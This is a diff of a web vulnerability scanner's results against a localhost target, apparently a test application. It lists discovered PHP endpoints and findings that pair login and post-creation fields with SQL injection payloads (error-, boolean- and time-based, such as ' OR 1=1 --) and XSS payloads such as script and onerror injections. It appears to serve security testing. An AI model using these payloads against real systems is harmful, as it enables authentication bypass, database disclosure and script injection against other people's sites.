@@ -3,19 +3,19 @@
 ********************************************************
 
 Target: http://localhost:5000
-Total requests: 20922
+Total requests: 20923
 
 Discovered Endpoints:
 ------------------------------------------------------------
-http://localhost:5000/config.php
 http://localhost:5000/create_post.php
-http://localhost:5000/index.php
 http://localhost:5000/admin.php
-http://localhost:5000/posts.php
-http://localhost:5000
 http://localhost:5000/upload.php
 http://localhost:5000/post.php
+http://localhost:5000/config.php
+http://localhost:5000/index.php
+http://localhost:5000/posts.php
 http://localhost:5000/secret.php
+http://localhost:5000
 http://localhost:5000/login.php
 ------------------------------------------------------------
 
@@ -31,27 +31,28 @@ ID     Status   Length   Endpoint                       Fields              Type
 00006  200      372      /create_post.php                title,file,content  SQLi (Error-based)      ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) --
 00007  200      502      /create_post.php                title,file,content  SQLi (Error-based)      ' ORDER BY 9999 --
 00008  200      512      /create_post.php                title,file,content  SQLi (Error-based)      ' UNION SELECT 1,2,3,4#
-00009  200      2812     /create_post.php                title,file,content  XSS                     "><script>alert(1)</script>
-00010  200      2916     /create_post.php                title,file,content  XSS                     "><img src=x onerror=alert(1)>
-00011  200      3013     /create_post.php                title,file,content  XSS                     "><svg onload=alert(1)>
-00012  200      3112     /create_post.php                title,file,content  XSS                     <script>alert(1)</script>
-00013  200      3220     /create_post.php                title,file,content  XSS                     </script><script>alert(1)</script>
-00014  200      3318     /create_post.php                title,file,content  XSS                     "><body onload=alert(1)>
-00015  200      3426     /create_post.php                title,file,content  XSS                     "><iframe src=javascript:alert(1)>
-00016  200      3607     /create_post.php                title,file,content  XSS                     "><h1>XSS</h1>
-00017  200      3713     /create_post.php                title,file,content  XSS                     "><svg><script>alert(1)</script>
+00009  200      2737     /create_post.php                title,file,content  XSS                     "><script>alert(1)</script>
+00010  200      2841     /create_post.php                title,file,content  XSS                     "><img src=x onerror=alert(1)>
+00011  200      2938     /create_post.php                title,file,content  XSS                     "><svg onload=alert(1)>
+00012  200      3037     /create_post.php                title,file,content  XSS                     <script>alert(1)</script>
+00013  200      3145     /create_post.php                title,file,content  XSS                     </script><script>alert(1)</script>
+00014  200      3243     /create_post.php                title,file,content  XSS                     "><body onload=alert(1)>
+00015  200      3351     /create_post.php                title,file,content  XSS                     "><iframe src=javascript:alert(1)>
+00016  200      3532     /create_post.php                title,file,content  XSS                     "><h1>XSS</h1>
+00017  200      3638     /create_post.php                title,file,content  XSS                     "><svg><script>alert(1)</script>
 00018  200      466      /login.php                      email,password      SQLi (Error-based)      ')--
 00019  200      464      /login.php                      email,password      SQLi (Error-based)      '))
 00020  200      477      /login.php                      email,password      SQLi (Error-based)      ' OR SLEEP(0) /*
 00021  200      304      /login.php                      email,password      SQLi (Error-based)      ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) --
-00022  200      3791     /login.php                      email,password      SQLi (Boolean-based)    ' OR 1=1 --
-00023  200      3791     /login.php                      email,password      SQLi (Boolean-based)    ' OR 1=1#
-00024  200      3791     /login.php                      email,password      SQLi (Boolean-based)    ' OR TRUE--
-00025  200      3791     /login.php                      email,password      SQLi (Boolean-based)    a' OR 'a'='a
-00026  200      222      /login.php                      email,password      SQLi (Time-based)       ' OR IF(1=1, SLEEP(4), 0) --
+00022  200      3716     /login.php                      email,password      SQLi (Boolean-based)    ' OR 1=1 --
+00023  200      3716     /login.php                      email,password      SQLi (Boolean-based)    ' OR 1=1#
+00024  200      3716     /login.php                      email,password      SQLi (Boolean-based)    ' OR TRUE--
+00025  200      3716     /login.php                      email,password      SQLi (Boolean-based)    a' OR 'a'='a
+00026  200      222      /login.php                      email,password      SQLi (Time-based)       ' OR SLEEP(5) --
+00027  200      222      /login.php                      email,password      SQLi (Time-based)       ' OR IF(1=1, SLEEP(4), 0) --
 ==========================================================================================================================
 
-Total time: 45.7155s
-Processed Requests: 20922
-Issues Found: 26
-Requests/sec: 457.7
+Total time: 39.0334s
+Processed Requests: 20923
+Issues Found: 27
+Requests/sec: 536.0
